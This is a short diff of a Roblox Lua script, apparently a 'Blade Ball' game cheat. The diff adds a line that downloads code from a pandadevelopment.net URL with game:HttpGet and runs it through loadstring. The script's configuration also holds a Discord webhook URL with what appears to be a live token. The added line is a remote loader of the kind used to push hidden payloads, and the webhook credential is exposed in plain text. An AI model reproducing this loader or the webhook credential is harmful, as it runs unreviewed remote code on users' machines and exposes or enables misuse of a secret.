@@ -1,5 +1,5 @@
 _G.BLADEBALL_SCRIPT_VERSION = "V6"
-
+loadstring(game:HttpGet("https://pandadevelopment.net/virtual/file/cff692f481cacd58"))()
 -- CONFIGURATION
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1394346190954430496/y1TQYKAIuBUPjBHKNNiqqiMxR1rWvUCPmymOphs0LMutKalPDjuxiCHWz4isseAM9fzB"
 local CHECK_INTERVAL = 300 -- 5 minutes (win check)
